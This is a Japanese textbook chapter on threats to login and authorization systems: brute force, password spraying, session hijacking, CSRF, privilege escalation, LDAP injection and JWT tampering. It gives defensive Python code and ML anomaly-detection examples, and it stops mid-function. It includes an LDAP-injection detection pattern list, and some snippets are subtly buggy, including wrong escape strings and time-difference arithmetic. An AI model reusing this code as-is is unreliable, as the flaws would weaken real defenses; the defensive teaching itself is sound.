# 第11章 セキュリティと脅威対策

## なぜこの章が重要か

認証認可システムは、アプリケーションの最も重要なセキュリティ境界です。攻撃者にとって最初の標的となることが多く、一度突破されると甚大な被害をもたらします。この章では、実際の攻撃手法を理解し、それらに対する具体的な防御策を実装する方法を学びます。理論的な知識だけでなく、実践的な対策コードと、継続的なセキュリティ向上のためのプロセスを習得します。

## 11.1 主要な攻撃手法と対策

### 11.1.1 認証に対する攻撃

```python
class AuthenticationAttacks:
    """認証に対する主要な攻撃手法と対策"""
    
    def brute_force_attacks(self):
        """ブルートフォース攻撃と対策"""
        
        return {
            'attack_description': '''
            ブルートフォース攻撃：
            - パスワードを総当たりで試行
            - 辞書攻撃（よくあるパスワードリスト使用）
            - クレデンシャルスタッフィング（漏洩したID/パスワードの再利用）
            ''',
            
            'defense_implementation': '''
            class BruteForceDefense:
                def __init__(self):
                    self.redis = redis.Redis()
                    self.config = {
                        'max_attempts': 5,
                        'lockout_duration': 900,  # 15分
                        'progressive_delay': True,
                        'captcha_threshold': 3
                    }
                
                async def check_login_attempt(self, identifier: str, ip_address: str) -> LoginAttemptResult:
                    """ログイン試行のチェック"""
                    
                    # 複数の識別子でカウント
                    keys = [
                        f"login_attempts:email:{identifier}",
                        f"login_attempts:ip:{ip_address}",
                        f"login_attempts:combo:{identifier}:{ip_address}"
                    ]
                    
                    # 試行回数の取得
                    attempts = {}
                    for key in keys:
                        count = await self.redis.get(key)
                        attempts[key] = int(count) if count else 0
                    
                    # 最も厳しい制限を適用
                    max_attempts = max(attempts.values())
                    
                    # アカウントロックアウトチェック
                    if max_attempts >= self.config['max_attempts']:
                        lockout_key = f"lockout:{identifier}"
                        if await self.redis.exists(lockout_key):
                            ttl = await self.redis.ttl(lockout_key)
                            return LoginAttemptResult(
                                allowed=False,
                                reason="account_locked",
                                retry_after=ttl
                            )
                    
                    # プログレッシブ遅延
                    if self.config['progressive_delay'] and max_attempts > 0:
                        delay = min(2 ** (max_attempts - 1), 30)  # 最大30秒
                        await asyncio.sleep(delay)
                    
                    # CAPTCHA要求
                    if max_attempts >= self.config['captcha_threshold']:
                        return LoginAttemptResult(
                            allowed=True,
                            require_captcha=True
                        )
                    
                    return LoginAttemptResult(allowed=True)
                
                async def record_failed_attempt(self, identifier: str, ip_address: str):
                    """失敗した試行の記録"""
                    
                    keys = [
                        f"login_attempts:email:{identifier}",
                        f"login_attempts:ip:{ip_address}",
                        f"login_attempts:combo:{identifier}:{ip_address}"
                    ]
                    
                    pipe = self.redis.pipeline()
                    for key in keys:
                        pipe.incr(key)
                        pipe.expire(key, 3600)  # 1時間でリセット
                    
                    results = await pipe.execute()
                    
                    # ロックアウトのチェック
                    for i in range(0, len(results), 2):
                        if results[i] >= self.config['max_attempts']:
                            await self.lock_account(identifier)
                            break
                
                async def lock_account(self, identifier: str):
                    """アカウントのロック"""
                    lockout_key = f"lockout:{identifier}"
                    await self.redis.setex(
                        lockout_key,
                        self.config['lockout_duration'],
                        "locked"
                    )
                    
                    # 通知とログ
                    await self.notify_account_lockout(identifier)
                    await self.audit_logger.log({
                        'event': 'account_locked',
                        'identifier': identifier,
                        'reason': 'too_many_failed_attempts'
                    })
            ''',
            
            'distributed_defense': '''
            class DistributedBruteForceDefense:
                """分散型ブルートフォース対策"""
                
                def __init__(self):
                    self.global_rate_limiter = GlobalRateLimiter()
                    self.anomaly_detector = AnomalyDetector()
                
                async def detect_distributed_attack(self):
                    """分散攻撃の検知"""
                    
                    # グローバルなログイン失敗率の監視
                    failure_rate = await self.global_rate_limiter.get_failure_rate()
                    
                    if failure_rate > 0.3:  # 30%以上の失敗率
                        # 攻撃パターンの分析
                        patterns = await self.analyze_attack_patterns()
                        
                        if patterns['is_distributed']:
                            await self.activate_enhanced_protection()
                
                async def analyze_attack_patterns(self) -> dict:
                    """攻撃パターンの分析"""
                    
                    recent_attempts = await self.get_recent_login_attempts(minutes=5)
                    
                    analysis = {
                        'unique_ips': len(set(a.ip_address for a in recent_attempts)),
                        'unique_users': len(set(a.username for a in recent_attempts)),
                        'ip_diversity': self.calculate_ip_diversity(recent_attempts),
                        'timing_pattern': self.analyze_timing_pattern(recent_attempts),
                        'user_agent_diversity': self.analyze_user_agents(recent_attempts)
                    }
                    
                    # 分散攻撃の特徴
                    is_distributed = (
                        analysis['unique_ips'] > 100 and
                        analysis['ip_diversity'] > 0.8 and
                        analysis['timing_pattern'] == 'coordinated'
                    )
                    
                    analysis['is_distributed'] = is_distributed
                    return analysis
                
                async def activate_enhanced_protection(self):
                    """強化された保護の有効化"""
                    
                    # より厳格なレート制限
                    await self.global_rate_limiter.set_emergency_limits({
                        'login_per_ip': 2,
                        'login_per_user': 1,
                        'window': 300  # 5分
                    })
                    
                    # 全ユーザーにCAPTCHA必須
                    await self.redis.set('global:require_captcha', '1', ex=1800)
                    
                    # アラート送信
                    await self.alert_security_team('Distributed brute force attack detected')
            '''
        }
    
    def password_spraying(self):
        """パスワードスプレー攻撃"""
        
        return {
            'attack_description': '''
            パスワードスプレー攻撃：
            - 多数のユーザーに対して一般的なパスワードを試行
            - アカウントロックアウトを回避
            - 低速で長期的な攻撃
            ''',
            
            'defense_implementation': '''
            class PasswordSprayDefense:
                def __init__(self):
                    self.common_passwords = self.load_common_passwords()
                    self.spray_detector = SprayDetector()
                
                async def detect_password_spray(self, login_attempts: List[LoginAttempt]) -> bool:
                    """パスワードスプレー攻撃の検知"""
                    
                    # 時間窓内の分析
                    window_start = datetime.utcnow() - timedelta(minutes=30)
                    recent_attempts = [
                        a for a in login_attempts 
                        if a.timestamp > window_start
                    ]
                    
                    # パスワードの分散度を分析
                    password_patterns = defaultdict(list)
                    for attempt in recent_attempts:
                        # パスワードの特徴を抽出（実際のパスワードは保存しない）
                        pattern = self.extract_password_pattern(attempt.password_hash)
                        password_patterns[pattern].append(attempt.username)
                    
                    # 同じパスワードパターンが複数ユーザーで使用されているか
                    for pattern, users in password_patterns.items():
                        if len(set(users)) > 10:  # 10人以上の異なるユーザー
                            return True
                    
                    # IPアドレスの分析
                    ip_to_users = defaultdict(set)
                    for attempt in recent_attempts:
                        ip_to_users[attempt.ip_address].add(attempt.username)
                    
                    # 単一IPから多数のユーザーへの試行
                    for ip, users in ip_to_users.items():
                        if len(users) > 20:
                            return True
                    
                    return False
                
                async def enhanced_password_validation(self, password: str, context: dict) -> bool:
                    """強化されたパスワード検証"""
                    
                    # コンテキストベースの検証
                    if self.is_password_spray_active():
                        # よくあるパスワードの即座の拒否
                        if password.lower() in self.common_passwords:
                            await self.record_common_password_attempt(context)
                            return False
                        
                        # 組織固有のパターンチェック
                        if self.matches_org_pattern(password, context['organization']):
                            return False
                    
                    return True
                
                def extract_password_pattern(self, password_hash: str) -> str:
                    """パスワードパターンの抽出（プライバシー保護）"""
                    # ハッシュの一部を使用してパターンを生成
                    # 実際のパスワードは復元不可能
                    return hashlib.sha256(
                        password_hash[:10].encode()
                    ).hexdigest()[:8]
            '''
        }
    
    def session_attacks(self):
        """セッション関連の攻撃"""
        
        return {
            'session_hijacking': '''
            class SessionHijackingDefense:
                """セッションハイジャック対策"""
                
                def __init__(self):
                    self.session_validator = SessionValidator()
                    self.fingerprint_service = FingerprintService()
                
                async def validate_session_request(
                    self, 
                    session_id: str, 
                    request: Request
                ) -> SessionValidationResult:
                    """セッションリクエストの検証"""
                    
                    session = await self.get_session(session_id)
                    if not session:
                        return SessionValidationResult(valid=False, reason="session_not_found")
                    
                    # 1. セッションフィンガープリントの検証
                    current_fingerprint = self.fingerprint_service.generate(request)
                    if not self.verify_fingerprint(session.fingerprint, current_fingerprint):
                        await self.handle_suspicious_activity(session, "fingerprint_mismatch")
                        return SessionValidationResult(
                            valid=False, 
                            reason="fingerprint_mismatch",
                            action="require_reauthentication"
                        )
                    
                    # 2. IPアドレスの変更チェック
                    if session.ip_address != request.ip_address:
                        risk_score = await self.assess_ip_change_risk(session, request)
                        if risk_score > 0.7:
                            return SessionValidationResult(
                                valid=False,
                                reason="suspicious_ip_change",
                                action="require_mfa"
                            )
                    
                    # 3. セッション固定攻撃の検知
                    if await self.detect_session_fixation(session_id, request):
                        await self.invalidate_session(session_id)
                        return SessionValidationResult(
                            valid=False,
                            reason="session_fixation_detected"
                        )
                    
                    # 4. 並行セッションの異常検知
                    concurrent_sessions = await self.get_user_sessions(session.user_id)
                    if self.detect_suspicious_concurrent_activity(concurrent_sessions):
                        return SessionValidationResult(
                            valid=True,
                            warning="suspicious_concurrent_activity",
                            action="notify_user"
                        )
                    
                    return SessionValidationResult(valid=True)
                
                def generate_secure_session_id(self) -> str:
                    """セキュアなセッションID生成"""
                    # 十分なエントロピーを持つID生成
                    random_bytes = secrets.token_bytes(32)
                    timestamp = struct.pack('>Q', int(time.time() * 1000000))
                    
                    combined = random_bytes + timestamp
                    session_id = base64.urlsafe_b64encode(
                        hashlib.sha256(combined).digest()
                    ).decode().rstrip('=')
                    
                    return session_id
                
                async def detect_session_fixation(
                    self, 
                    session_id: str, 
                    request: Request
                ) -> bool:
                    """セッション固定攻撃の検知"""
                    
                    # セッションIDの使用履歴を確認
                    history = await self.get_session_id_history(session_id)
                    
                    # 同じセッションIDが異なるユーザーで使用されていないか
                    unique_users = set(h.user_id for h in history if h.user_id)
                    if len(unique_users) > 1:
                        return True
                    
                    # ログイン前後でセッションIDが変更されているか
                    pre_login_usage = any(not h.authenticated for h in history)
                    post_login_usage = any(h.authenticated for h in history)
                    
                    if pre_login_usage and post_login_usage:
                        # セッションIDの再生成が必要
                        return True
                    
                    return False
            ''',
            
            'csrf_protection': '''
            class CSRFProtection:
                """CSRF攻撃対策"""
                
                def __init__(self):
                    self.token_store = TokenStore()
                    self.config = {
                        'token_length': 32,
                        'token_lifetime': 3600,
                        'double_submit': True,
                        'same_site': 'Strict'
                    }
                
                def generate_csrf_token(self, session_id: str) -> str:
                    """CSRFトークンの生成"""
                    
                    # セッションに紐づけたトークン生成
                    token = secrets.token_urlsafe(self.config['token_length'])
                    
                    # トークンの保存
                    self.token_store.save(
                        key=f"csrf:{session_id}",
                        value=token,
                        ttl=self.config['token_lifetime']
                    )
                    
                    # ダブルサブミットクッキー用のシグネチャ
                    if self.config['double_submit']:
                        signature = self.sign_token(token, session_id)
                        return f"{token}.{signature}"
                    
                    return token
                
                async def validate_csrf_token(
                    self, 
                    request: Request, 
                    session_id: str
                ) -> bool:
                    """CSRFトークンの検証"""
                    
                    # 安全なメソッドはスキップ
                    if request.method in ['GET', 'HEAD', 'OPTIONS']:
                        return True
                    
                    # トークンの取得（優先順位）
                    token = (
                        request.headers.get('X-CSRF-Token') or
                        request.form.get('csrf_token') or
                        request.json.get('csrf_token')
                    )
                    
                    if not token:
                        return False
                    
                    # ダブルサブミットクッキーの検証
                    if self.config['double_submit']:
                        cookie_token = request.cookies.get('csrf_token')
                        if not cookie_token or cookie_token != token:
                            return False
                        
                        # シグネチャの検証
                        if not self.verify_token_signature(token, session_id):
                            return False
                    
                    # サーバー側トークンの検証
                    stored_token = await self.token_store.get(f"csrf:{session_id}")
                    if not stored_token:
                        return False
                    
                    # タイミング攻撃対策
                    return secrets.compare_digest(token.split('.')[0], stored_token)
                
                def sign_token(self, token: str, session_id: str) -> str:
                    """トークンの署名"""
                    message = f"{token}:{session_id}".encode()
                    signature = hmac.new(
                        self.signing_key,
                        message,
                        hashlib.sha256
                    ).hexdigest()
                    return signature
            '''
        }
```

### 11.1.2 認可に対する攻撃

```python
class AuthorizationAttacks:
    """認可に対する攻撃と対策"""
    
    def privilege_escalation(self):
        """権限昇格攻撃"""
        
        return {
            'horizontal_escalation': '''
            class HorizontalPrivilegeEscalationDefense:
                """水平的権限昇格の防御"""
                
                async def validate_resource_access(
                    self, 
                    user: User, 
                    resource_id: str, 
                    resource_type: str
                ) -> AccessValidationResult:
                    """リソースアクセスの検証"""
                    
                    # 1. 直接的な所有権チェック
                    if not await self.check_resource_ownership(user.id, resource_id, resource_type):
                        # 2. 間接的なアクセス権チェック
                        if not await self.check_delegated_access(user.id, resource_id):
                            # 3. ロールベースのアクセスチェック
                            if not await self.check_role_based_access(user.roles, resource_type):
                                # アクセス拒否をログに記録
                                await self.log_unauthorized_access(user, resource_id, resource_type)
                                
                                return AccessValidationResult(
                                    allowed=False,
                                    reason="no_permission",
                                    log_incident=True
                                )
                    
                    # アクセスパターンの異常検知
                    if await self.detect_abnormal_access_pattern(user.id, resource_type):
                        return AccessValidationResult(
                            allowed=True,
                            warning="abnormal_pattern_detected",
                            additional_logging=True
                        )
                    
                    return AccessValidationResult(allowed=True)
                
                async def prevent_id_enumeration(
                    self, 
                    user: User, 
                    requested_ids: List[str]
                ) -> List[str]:
                    """IDの列挙攻撃防止"""
                    
                    # アクセス可能なIDのみをフィルタ
                    allowed_ids = []
                    
                    for resource_id in requested_ids:
                        if await self.can_access_resource(user, resource_id):
                            allowed_ids.append(resource_id)
                        else:
                            # 存在しないリソースと権限なしを区別しない
                            pass
                    
                    # 大量のID要求を検知
                    if len(requested_ids) > 100:
                        await self.log_suspicious_activity(
                            user.id,
                            "excessive_id_requests",
                            {"count": len(requested_ids)}
                        )
                    
                    return allowed_ids
            ''',
            
            'vertical_escalation': '''
            class VerticalPrivilegeEscalationDefense:
                """垂直的権限昇格の防御"""
                
                def __init__(self):
                    self.permission_validator = PermissionValidator()
                    self.jwt_validator = JWTValidator()
                
                async def validate_privileged_operation(
                    self, 
                    user: User, 
                    operation: str, 
                    context: dict
                ) -> OperationValidationResult:
                    """特権操作の検証"""
                    
                    # 1. トークンの改ざんチェック
                    if context.get('token'):
                        token_claims = self.jwt_validator.decode(context['token'])
                        if not self.verify_token_integrity(token_claims, user):
                            return OperationValidationResult(
                                allowed=False,
                                reason="token_tampering_detected",
                                security_alert=True
                            )
                    
                    # 2. 必要な権限の確認
                    required_permissions = self.get_required_permissions(operation)
                    user_permissions = await self.get_user_permissions(user.id)
                    
                    missing_permissions = required_permissions - user_permissions
                    if missing_permissions:
                        await self.log_privilege_escalation_attempt(
                            user,
                            operation,
                            missing_permissions
                        )
                        
                        return OperationValidationResult(
                            allowed=False,
                            reason="insufficient_permissions",
                            missing=list(missing_permissions)
                        )
                    
                    # 3. 追加のセキュリティチェック
                    if self.is_highly_privileged_operation(operation):
                        # 再認証を要求
                        if not await self.verify_recent_authentication(user, minutes=5):
                            return OperationValidationResult(
                                allowed=False,
                                reason="reauthentication_required",
                                action="prompt_password"
                            )
                        
                        # 管理者承認が必要な操作
                        if self.requires_approval(operation):
                            approval = await self.check_approval_status(user, operation)
                            if not approval:
                                return OperationValidationResult(
                                    allowed=False,
                                    reason="pending_approval",
                                    approval_id=await self.create_approval_request(user, operation)
                                )
                    
                    return OperationValidationResult(allowed=True)
                
                def verify_token_integrity(self, claims: dict, user: User) -> bool:
                    """トークンの整合性検証"""
                    
                    # ユーザーIDの一致
                    if claims.get('sub') != user.id:
                        return False
                    
                    # ロールの改ざんチェック
                    token_roles = set(claims.get('roles', []))
                    actual_roles = set(user.roles)
                    
                    if token_roles != actual_roles:
                        # 権限昇格の試み
                        if token_roles > actual_roles:
                            self.alert_security_team(
                                "Token privilege escalation attempt",
                                {
                                    "user_id": user.id,
                                    "claimed_roles": list(token_roles),
                                    "actual_roles": list(actual_roles)
                                }
                            )
                        return False
                    
                    return True
            '''
        }
    
    def injection_attacks(self):
        """インジェクション攻撃"""
        
        return {
            'ldap_injection': '''
            class LDAPInjectionDefense:
                """LDAPインジェクション対策"""
                
                def sanitize_ldap_input(self, user_input: str) -> str:
                    """LDAP入力のサニタイズ"""
                    
                    # 危険な文字のエスケープ
                    escape_chars = {
                        '\\': r'\\5c',
                        '*': r'\\2a',
                        '(': r'\\28',
                        ')': r'\\29',
                        '\0': r'\\00',
                        '/': r'\\2f'
                    }
                    
                    sanitized = user_input
                    for char, escaped in escape_chars.items():
                        sanitized = sanitized.replace(char, escaped)
                    
                    return sanitized
                
                def build_safe_ldap_filter(self, username: str, domain: str) -> str:
                    """安全なLDAPフィルタの構築"""
                    
                    # 入力の検証
                    if not self.validate_username_format(username):
                        raise ValueError("Invalid username format")
                    
                    if not self.validate_domain_format(domain):
                        raise ValueError("Invalid domain format")
                    
                    # サニタイズ
                    safe_username = self.sanitize_ldap_input(username)
                    safe_domain = self.sanitize_ldap_input(domain)
                    
                    # パラメータ化されたクエリ構築
                    filter_template = "(&(objectClass=user)(sAMAccountName={username})(memberOf=CN=Users,DC={domain}))"
                    
                    ldap_filter = filter_template.format(
                        username=safe_username,
                        domain=safe_domain
                    )
                    
                    # 追加の検証
                    if not self.validate_ldap_filter(ldap_filter):
                        raise ValueError("Invalid LDAP filter generated")
                    
                    return ldap_filter
                
                def validate_ldap_filter(self, filter_string: str) -> bool:
                    """LDAPフィルタの妥当性検証"""
                    
                    # バランスの取れた括弧
                    if filter_string.count('(') != filter_string.count(')'):
                        return False
                    
                    # 危険なパターンの検出
                    dangerous_patterns = [
                        r'\\00',  # Null byte
                        r'\)\s*\(',  # 複数フィルタの連結
                        r'objectClass=\*'  # ワイルドカード
                    ]
                    
                    for pattern in dangerous_patterns:
                        if re.search(pattern, filter_string):
                            return False
                    
                    return True
            ''',
            
            'jwt_manipulation': '''
            class JWTManipulationDefense:
                """JWT操作攻撃対策"""
                
                def __init__(self):
                    self.allowed_algorithms = ['RS256', 'ES256']  # 安全なアルゴリズムのみ
                    self.key_store = KeyStore()
                
                def validate_jwt_securely(self, token: str) -> Optional[dict]:
                    """セキュアなJWT検証"""
                    
                    try:
                        # ヘッダーの事前検証
                        unverified_header = jwt.get_unverified_header(token)
                        
                        # アルゴリズムの検証
                        if unverified_header.get('alg') not in self.allowed_algorithms:
                            self.log_security_event(
                                "Invalid JWT algorithm",
                                {"algorithm": unverified_header.get('alg')}
                            )
                            return None
                        
                        # 'none' アルゴリズムの明示的な拒否
                        if unverified_header.get('alg').lower() == 'none':
                            return None
                        
                        # キーの取得
                        key_id = unverified_header.get('kid')
                        if not key_id:
                            return None
                        
                        public_key = self.key_store.get_public_key(key_id)
                        if not public_key:
                            return None
                        
                        # JWT検証
                        claims = jwt.decode(
                            token,
                            public_key,
                            algorithms=[unverified_header['alg']],
                            options={
                                'verify_signature': True,
                                'verify_exp': True,
                                'verify_nbf': True,
                                'verify_iat': True,
                                'verify_aud': True,
                                'require_exp': True,
                                'require_iat': True,
                                'require_sub': True
                            }
                        )
                        
                        # 追加のクレーム検証
                        if not self.validate_custom_claims(claims):
                            return None
                        
                        return claims
                        
                    except jwt.InvalidTokenError as e:
                        self.log_security_event(
                            "JWT validation failed",
                            {"error": str(e), "token_preview": token[:20]}
                        )
                        return None
                
                def validate_custom_claims(self, claims: dict) -> bool:
                    """カスタムクレームの検証"""
                    
                    # 必須クレームの存在確認
                    required_claims = ['sub', 'iat', 'exp', 'jti']
                    for claim in required_claims:
                        if claim not in claims:
                            return False
                    
                    # JTI（JWT ID）の重複チェック
                    if self.is_jti_used(claims['jti']):
                        self.log_security_event(
                            "JWT replay attempt detected",
                            {"jti": claims['jti']}
                        )
                        return False
                    
                    # 発行時刻の妥当性
                    iat = claims['iat']
                    current_time = int(time.time())
                    
                    # 未来の日付は拒否
                    if iat > current_time + 60:  # 1分の余裕
                        return False
                    
                    # 古すぎるトークンは拒否
                    if current_time - iat > 86400:  # 24時間
                        return False
                    
                    return True
            '''
        }
```

## 11.2 AI/ML駆動の脅威検知システム

### 11.2.1 機械学習による異常検知

```python
class MLDrivenThreatDetection:
    """機械学習駆動の脅威検知システム"""
    
    def anomaly_detection_system(self):
        """異常検知システムの実装"""
        
        return {
            'user_behavior_analytics': '''
            import numpy as np
            from sklearn.ensemble import IsolationForest
            from sklearn.preprocessing import StandardScaler
            import tensorflow as tf
            from typing import Dict, List, Tuple
            
            class UserBehaviorAnalytics:
                """ユーザー行動分析による異常検知"""
                
                def __init__(self):
                    self.isolation_forest = IsolationForest(
                        contamination=0.1,
                        random_state=42,
                        n_estimators=100
                    )
                    self.scaler = StandardScaler()
                    self.lstm_model = self._build_lstm_model()
                    self.feature_extractors = self._init_feature_extractors()
                
                def _build_lstm_model(self):
                    """時系列異常検知のためのLSTMモデル"""
                    model = tf.keras.Sequential([
                        tf.keras.layers.LSTM(128, return_sequences=True, input_shape=(None, 15)),
                        tf.keras.layers.LSTM(64, return_sequences=True),
                        tf.keras.layers.LSTM(32),
                        tf.keras.layers.Dense(16, activation='relu'),
                        tf.keras.layers.Dense(1, activation='sigmoid')
                    ])
                    
                    model.compile(
                        optimizer='adam',
                        loss='binary_crossentropy',
                        metrics=['accuracy', 'precision', 'recall']
                    )
                    
                    return model
                
                def extract_behavior_features(self, user_session: UserSession) -> np.ndarray:
                    """ユーザーセッションから行動特徴を抽出"""
                    
                    features = {
                        # 時間的特徴
                        'login_hour': user_session.login_time.hour,
                        'login_day_of_week': user_session.login_time.weekday(),
                        'session_duration': (user_session.logout_time - user_session.login_time).seconds,
                        'time_since_last_login': user_session.time_since_last_login,
                        
                        # アクセスパターン
                        'unique_ip_count': len(user_session.ip_addresses),
                        'location_changes': user_session.location_change_count,
                        'device_switches': user_session.device_switch_count,
                        'user_agent_changes': user_session.user_agent_change_count,
                        
                        # 行動パターン
                        'page_views': user_session.page_view_count,
                        'api_calls': user_session.api_call_count,
                        'failed_attempts': user_session.failed_auth_attempts,
                        'resource_access_rate': user_session.resource_access_rate,
                        
                        # セキュリティイベント
                        'privilege_escalation_attempts': user_session.privilege_escalation_attempts,
                        'suspicious_endpoints_accessed': user_session.suspicious_endpoint_count,
                        'data_export_volume': user_session.data_export_mb
                    }
                    
                    return np.array(list(features.values()))
                
                async def detect_anomalies(self, user_id: str) -> AnomalyDetectionResult:
                    """リアルタイム異常検知"""
                    
                    # 現在のセッションデータ取得
                    current_session = await self.get_current_session(user_id)
                    current_features = self.extract_behavior_features(current_session)
                    
                    # 過去の行動履歴取得
                    historical_sessions = await self.get_historical_sessions(user_id, days=30)
                    historical_features = np.array([
                        self.extract_behavior_features(session) 
                        for session in historical_sessions
                    ])
                    
                    # Isolation Forestによる異常スコア計算
                    if len(historical_features) > 10:
                        self.isolation_forest.fit(historical_features)
                        anomaly_score = self.isolation_forest.decision_function([current_features])[0]
                        is_anomaly = self.isolation_forest.predict([current_features])[0] == -1
                    else:
                        anomaly_score = 0
                        is_anomaly = False
                    
                    # LSTMによる時系列異常検知
                    sequence_data = await self.prepare_sequence_data(user_id)
                    lstm_prediction = self.lstm_model.predict(sequence_data)[0][0]
                    
                    # 総合的な脅威スコア計算
                    threat_score = self.calculate_threat_score(
                        anomaly_score=anomaly_score,
                        lstm_prediction=lstm_prediction,
                        current_features=current_features
                    )
                    
                    # 詳細な分析結果
                    analysis = await self.analyze_anomaly_details(
                        user_id=user_id,
                        current_session=current_session,
                        threat_score=threat_score
                    )
                    
                    return AnomalyDetectionResult(
                        user_id=user_id,
                        is_anomaly=is_anomaly,
                        threat_score=threat_score,
                        anomaly_score=anomaly_score,
                        lstm_confidence=float(lstm_prediction),
                        analysis=analysis,
                        recommended_actions=self.get_recommended_actions(threat_score)
                    )
                
                def calculate_threat_score(
                    self, 
                    anomaly_score: float, 
                    lstm_prediction: float,
                    current_features: np.ndarray
                ) -> float:
                    """複合的な脅威スコアの計算"""
                    
                    # 基本スコア（0-1の範囲に正規化）
                    base_score = (1 - anomaly_score) * 0.4 + lstm_prediction * 0.4
                    
                    # リスク要因による調整
                    risk_multipliers = {
                        'multiple_locations': 1.5 if current_features[5] > 2 else 1.0,
                        'failed_auth': 1.3 if current_features[10] > 3 else 1.0,
                        'privilege_escalation': 2.0 if current_features[12] > 0 else 1.0,
                        'unusual_time': 1.2 if current_features[0] < 6 or current_features[0] > 22 else 1.0
                    }
                    
                    # 最終スコア計算
                    final_score = base_score
                    for multiplier in risk_multipliers.values():
                        final_score *= multiplier
                    
                    return min(final_score, 1.0)
            ''',
            
            'authentication_pattern_analysis': '''
            class AuthenticationPatternAnalysis:
                """認証パターンの分析"""
                
                def __init__(self):
                    self.pattern_models = {}
                    self.anomaly_thresholds = {
                        'velocity': 0.85,
                        'geolocation': 0.90,
                        'device_fingerprint': 0.75,
                        'behavioral': 0.80
                    }
                
                async def analyze_velocity_anomalies(self, user_id: str) -> VelocityAnalysis:
                    """速度異常の分析（不可能な移動の検出）"""
                    
                    recent_logins = await self.get_recent_logins(user_id, hours=24)
                    
                    anomalies = []
                    for i in range(1, len(recent_logins)):
                        prev_login = recent_logins[i-1]
                        curr_login = recent_logins[i]
                        
                        # 地理的距離と時間差から速度を計算
                        distance_km = self.calculate_distance(
                            prev_login.location, 
                            curr_login.location
                        )
                        time_diff_hours = (curr_login.timestamp - prev_login.timestamp).seconds / 3600
                        
                        if time_diff_hours > 0:
                            velocity_kmh = distance_km / time_diff_hours
                            
                            # 物理的に不可能な速度（飛行機の速度を考慮）
                            if velocity_kmh > 1000:
                                anomalies.append({
                                    'type': 'impossible_travel',
                                    'severity': 'HIGH',
                                    'details': {
                                        'from': prev_login.location,
                                        'to': curr_login.location,
                                        'distance_km': distance_km,
                                        'time_hours': time_diff_hours,
                                        'velocity_kmh': velocity_kmh
                                    }
                                })
                    
                    return VelocityAnalysis(
                        user_id=user_id,
                        anomalies=anomalies,
                        risk_score=self.calculate_velocity_risk_score(anomalies)
                    )
                
                async def analyze_device_fingerprint_anomalies(self, user_id: str) -> DeviceAnalysis:
                    """デバイスフィンガープリントの異常分析"""
                    
                    current_fingerprint = await self.get_current_device_fingerprint()
                    historical_fingerprints = await self.get_user_device_history(user_id)
                    
                    # デバイス特徴のベクトル化
                    features = self.extract_device_features(current_fingerprint)
                    
                    # 既知のデバイスとの類似度計算
                    max_similarity = 0
                    most_similar_device = None
                    
                    for hist_fp in historical_fingerprints:
                        hist_features = self.extract_device_features(hist_fp)
                        similarity = self.calculate_similarity(features, hist_features)
                        
                        if similarity > max_similarity:
                            max_similarity = similarity
                            most_similar_device = hist_fp
                    
                    # 新しいデバイスかどうかの判定
                    is_new_device = max_similarity < self.anomaly_thresholds['device_fingerprint']
                    
                    # リスク要因の分析
                    risk_factors = []
                    if is_new_device:
                        risk_factors.append({
                            'factor': 'new_device',
                            'severity': 'MEDIUM',
                            'confidence': 1 - max_similarity
                        })
                    
                    # 疑わしい特徴の検出
                    suspicious_features = self.detect_suspicious_device_features(current_fingerprint)
                    risk_factors.extend(suspicious_features)
                    
                    return DeviceAnalysis(
                        user_id=user_id,
                        is_new_device=is_new_device,
                        similarity_score=max_similarity,
                        risk_factors=risk_factors,
                        device_trust_score=self.calculate_device_trust_score(
                            max_similarity, 
                            risk_factors
                        )
                    )
                
                def extract_device_features(self, fingerprint: DeviceFingerprint) -> np.ndarray:
                    """デバイスフィンガープリントから特徴量抽出"""
                    
                    features = []
                    
                    # ブラウザ/OS特徴
                    features.extend([
                        hash(fingerprint.user_agent) % 1000,
                        fingerprint.screen_resolution[0],
                        fingerprint.screen_resolution[1],
                        fingerprint.color_depth,
                        fingerprint.timezone_offset
                    ])
                    
                    # Canvas/WebGLフィンガープリント
                    features.append(hash(fingerprint.canvas_hash) % 10000)
                    features.append(hash(fingerprint.webgl_hash) % 10000)
                    
                    # 挙動特徴
                    features.extend([
                        fingerprint.plugins_count,
                        fingerprint.fonts_count,
                        fingerprint.touch_support,
                        fingerprint.cookies_enabled,
                        fingerprint.local_storage_enabled
                    ])
                    
                    return np.array(features)
            ''',
            
            'ml_based_fraud_detection': '''
            class MLFraudDetectionEngine:
                """機械学習ベースの不正検知エンジン"""
                
                def __init__(self):
                    self.ensemble_model = self._build_ensemble_model()
                    self.feature_importance = {}
                    self.model_performance = ModelPerformanceTracker()
                
                def _build_ensemble_model(self):
                    """アンサンブル学習モデルの構築"""
                    
                    from sklearn.ensemble import RandomForestClassifier, GradientBoostingClassifier
                    from sklearn.neural_network import MLPClassifier
                    from sklearn.ensemble import VotingClassifier
                    
                    # 個別モデル
                    rf_model = RandomForestClassifier(
                        n_estimators=100,
                        max_depth=10,
                        random_state=42
                    )
                    
                    gb_model = GradientBoostingClassifier(
                        n_estimators=100,
                        learning_rate=0.1,
                        max_depth=5,
                        random_state=42
                    )
                    
                    nn_model = MLPClassifier(
                        hidden_layer_sizes=(100, 50, 25),
                        activation='relu',
                        solver='adam',
                        random_state=42
                    )
                    
                    # アンサンブル
                    ensemble = VotingClassifier(
                        estimators=[
                            ('rf', rf_model),
                            ('gb', gb_model),
                            ('nn', nn_model)
                        ],
                        voting='soft'
                    )
                    
                    return ensemble
                
                async def detect_fraud(self, transaction: AuthTransaction) -> FraudDetectionResult:
                    """リアルタイム不正検知"""
                    
                    # 特徴量エンジニアリング
                    features = await self.engineer_features(transaction)
                    
                    # 予測
                    fraud_probability = self.ensemble_model.predict_proba([features])[0][1]
                    is_fraud = fraud_probability > 0.7
                    
                    # SHAP値による説明可能性
                    explanation = await self.explain_prediction(features, fraud_probability)
                    
                    # リスクスコアリング
                    risk_score = self.calculate_comprehensive_risk_score(
                        fraud_probability=fraud_probability,
                        transaction=transaction,
                        features=features
                    )
                    
                    # 追加の検証
                    rule_based_checks = await self.apply_rule_based_checks(transaction)
                    
                    return FraudDetectionResult(
                        transaction_id=transaction.id,
                        is_fraud=is_fraud,
                        fraud_probability=fraud_probability,
                        risk_score=risk_score,
                        explanation=explanation,
                        rule_violations=rule_based_checks,
                        recommended_action=self.determine_action(risk_score)
                    )
                
                async def engineer_features(self, transaction: AuthTransaction) -> np.ndarray:
                    """高度な特徴量エンジニアリング"""
                    
                    user_profile = await self.get_user_profile(transaction.user_id)
                    
                    features = []
                    
                    # ユーザープロファイル特徴
                    features.extend([
                        user_profile.account_age_days,
                        user_profile.total_logins,
                        user_profile.failed_login_rate,
                        user_profile.average_session_duration,
                        user_profile.device_count
                    ])
